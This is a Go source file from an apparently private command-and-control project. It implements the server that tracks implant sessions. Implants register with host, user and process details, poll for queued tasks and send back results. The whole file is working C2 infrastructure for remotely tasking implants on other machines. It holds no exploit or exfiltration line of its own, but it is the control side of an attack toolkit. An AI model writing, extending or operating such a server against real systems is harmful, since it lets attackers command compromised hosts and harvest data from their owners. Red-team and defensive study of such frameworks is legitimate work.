package c2

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/azizbinmohammad/private-c2/pkg/envelope"
	"github.com/google/uuid"
)

// Wire protocol message wrapper.
type Message struct {
	Type string          `json:"type"`
	Data json.RawMessage `json:"data"`
}

// Registration payload sent by the implant.
type RegisterData struct {
	ImplantID string `json:"implant_id"`
	Hostname  string `json:"hostname"`
	Username  string `json:"username"`
	OS        string `json:"os"`
	Arch      string `json:"arch"`
	PID       int    `json:"pid"`
	Process   string `json:"process"`
	Mode      string `json:"mode"`
}

// Registration acknowledgement sent to the implant.
type RegisterAckData struct {
	SessionID string `json:"session_id"`
	Interval  int    `json:"interval"`
}

// Checkin payload (heartbeat/poll).
type CheckinData struct {
	SessionID string `json:"session_id"`
}

// Tasking response sent to implant.
type TaskingData struct {
	Tasks []TaskWire `json:"tasks"`
}

// TaskWire is the on-wire representation of a task.
type TaskWire struct {
	ID   string `json:"id"`
	Type string `json:"type"`
	Args string `json:"args"`
}

// Result payload from implant.
type ResultData struct {
	SessionID string `json:"session_id"`
	TaskID    string `json:"task_id"`
	Success   bool   `json:"success"`
	Output    string `json:"output"`
	Error     string `json:"error"`
}

// ImplantSession holds metadata about a connected implant.
type ImplantSession struct {
	ID         string    `json:"id"`
	ImplantID  string    `json:"implant_id"`
	Hostname   string    `json:"hostname"`
	Username   string    `json:"username"`
	OS         string    `json:"os"`
	Arch       string    `json:"arch"`
	PID        int       `json:"pid"`
	Process    string    `json:"process"`
	Mode       string    `json:"mode"`
	RemoteAddr string    `json:"remote_addr"`
	Transport  string    `json:"transport"`
	LastCheckin time.Time `json:"last_checkin"`
	CreatedAt  time.Time `json:"created_at"`
	conn       net.Conn
}

// Task represents a pending task for an implant.
type Task struct {
	ID        string    `json:"id"`
	Type      string    `json:"type"`
	Args      string    `json:"args"`
	SessionID string    `json:"session_id"`
	CreatedAt time.Time `json:"created_at"`
}

// TaskResult stores a completed task result.
type TaskResult struct {
	TaskID      string    `json:"task_id"`
	SessionID   string    `json:"session_id"`
	Success     bool      `json:"success"`
	Output      string    `json:"output"`
	Error       string    `json:"error"`
	CompletedAt time.Time `json:"completed_at"`
}

// ImplantServer manages implant connections and task dispatch.
type ImplantServer struct {
	mu          sync.RWMutex
	sessions    map[string]*ImplantSession
	taskQueues  map[string][]*Task
	taskResults map[string]*TaskResult
}

// NewImplantServer creates a new ImplantServer.
func NewImplantServer() *ImplantServer {
	return &ImplantServer{
		sessions:    make(map[string]*ImplantSession),
		taskQueues:  make(map[string][]*Task),
		taskResults: make(map[string]*TaskResult),
	}
}

// HandleConnection manages the lifecycle of a single implant connection.
// It reads the registration message, then loops handling checkins and results.
func (s *ImplantServer) HandleConnection(conn net.Conn) {
	defer conn.Close()
	remoteAddr := conn.RemoteAddr().String()

	// Step 1: Read the first frame, expect a "register" message.
	frame, err := envelope.ReadFrame(conn)
	if err != nil {
		log.Printf("[c2] failed to read registration frame from %s: %v", remoteAddr, err)
		return
	}

	var msg Message
	if err := json.Unmarshal(frame, &msg); err != nil {
		log.Printf("[c2] invalid JSON from %s: %v", remoteAddr, err)
		return
	}

	if msg.Type != "register" {
		log.Printf("[c2] expected register from %s, got %q", remoteAddr, msg.Type)
		return
	}

	var reg RegisterData
	if err := json.Unmarshal(msg.Data, &reg); err != nil {
		log.Printf("[c2] invalid register data from %s: %v", remoteAddr, err)
		return
	}

	// Create session.
	sessionID := uuid.New().String()
	session := &ImplantSession{
		ID:         sessionID,
		ImplantID:  reg.ImplantID,
		Hostname:   reg.Hostname,
		Username:   reg.Username,
		OS:         reg.OS,
		Arch:       reg.Arch,
		PID:        reg.PID,
		Process:    reg.Process,
		Mode:       reg.Mode,
		RemoteAddr: remoteAddr,
		Transport:  "mtls",
		LastCheckin: time.Now(),
		CreatedAt:  time.Now(),
		conn:       conn,
	}

	s.mu.Lock()
	s.sessions[sessionID] = session
	s.mu.Unlock()

	log.Printf("[c2] new session %s from %s (%s@%s)", sessionID, remoteAddr, reg.Username, reg.Hostname)

	// Send register_ack.
	ack := RegisterAckData{SessionID: sessionID, Interval: 5000}
	if err := s.sendMessage(conn, "register_ack", ack); err != nil {
		log.Printf("[c2] failed to send register_ack to %s: %v", sessionID, err)
		s.removeSession(sessionID)
		return
	}

	// Step 2: Enter message loop.
	for {
		frame, err := envelope.ReadFrame(conn)
		if err != nil {
			log.Printf("[c2] session %s read error: %v", sessionID, err)
			break
		}

		var loopMsg Message
		if err := json.Unmarshal(frame, &loopMsg); err != nil {
			log.Printf("[c2] session %s invalid JSON: %v", sessionID, err)
			continue
		}

		switch loopMsg.Type {
		case "checkin":
			s.handleCheckin(conn, sessionID, loopMsg.Data)
		case "result":
			s.handleResult(conn, sessionID, loopMsg.Data)
		default:
			log.Printf("[c2] session %s unknown message type: %s", sessionID, loopMsg.Type)
		}
	}

	s.removeSession(sessionID)
	log.Printf("[c2] session %s disconnected", sessionID)
}

func (s *ImplantServer) handleCheckin(conn net.Conn, sessionID string, data json.RawMessage) {
	// Update last checkin time.
	s.mu.Lock()
	if sess, ok := s.sessions[sessionID]; ok {
		sess.LastCheckin = time.Now()
	}

	// Drain the task queue for this session.
	pending := s.taskQueues[sessionID]
	s.taskQueues[sessionID] = nil
	s.mu.Unlock()

	// Build tasking response.
	tasks := make([]TaskWire, 0, len(pending))
	for _, t := range pending {
		tasks = append(tasks, TaskWire{ID: t.ID, Type: t.Type, Args: t.Args})
	}

	tasking := TaskingData{Tasks: tasks}
	if err := s.sendMessage(conn, "tasking", tasking); err != nil {
		log.Printf("[c2] session %s: failed to send tasking: %v", sessionID, err)
	}
}

func (s *ImplantServer) handleResult(conn net.Conn, sessionID string, data json.RawMessage) {
	var res ResultData
	if err := json.Unmarshal(data, &res); err != nil {
		log.Printf("[c2] session %s: invalid result data: %v", sessionID, err)
		return
	}

	result := &TaskResult{
		TaskID:      res.TaskID,
		SessionID:   res.SessionID,
		Success:     res.Success,
		Output:      res.Output,
		Error:       res.Error,
		CompletedAt: time.Now(),
	}

	s.mu.Lock()
	s.taskResults[res.TaskID] = result
	s.mu.Unlock()

	log.Printf("[c2] session %s: result for task %s (success=%v)", sessionID, res.TaskID, res.Success)

	// Send result_ack.
	if err := s.sendMessage(conn, "result_ack", struct{}{}); err != nil {
		log.Printf("[c2] session %s: failed to send result_ack: %v", sessionID, err)
	}
}

func (s *ImplantServer) sendMessage(conn net.Conn, msgType string, data interface{}) error {
	dataBytes, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("marshal data: %w", err)
	}

	msg := Message{Type: msgType, Data: json.RawMessage(dataBytes)}
	frame, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("marshal message: %w", err)
	}

	return envelope.WriteFrame(conn, frame)
}

func (s *ImplantServer) removeSession(sessionID string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.sessions, sessionID)
}

// QueueTask adds a task for the given session. Returns the new task ID.
func (s *ImplantServer) QueueTask(sessionID, taskType, args string) (string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if _, ok := s.sessions[sessionID]; !ok {
		return "", fmt.Errorf("session %s not found", sessionID)
	}

	task := &Task{
		ID:        uuid.New().String(),
		Type:      taskType,
		Args:      args,
		SessionID: sessionID,
		CreatedAt: time.Now(),
	}

	s.taskQueues[sessionID] = append(s.taskQueues[sessionID], task)
	log.Printf("[c2] queued task %s (%s) for session %s", task.ID, taskType, sessionID)
	return task.ID, nil
}

// GetResult returns a completed task result, or nil if not yet available.
func (s *ImplantServer) GetResult(taskID string) *TaskResult {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.taskResults[taskID]
}

// ListSessions returns all currently connected sessions.
func (s *ImplantServer) ListSessions() []*ImplantSession {
	s.mu.RLock()
	defer s.mu.RUnlock()

	result := make([]*ImplantSession, 0, len(s.sessions))
	for _, sess := range s.sessions {
		result = append(result, sess)
	}
	return result
}

// GetSession returns a single session by ID, or nil.
func (s *ImplantServer) GetSession(sessionID string) *ImplantSession {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.sessions[sessionID]
}
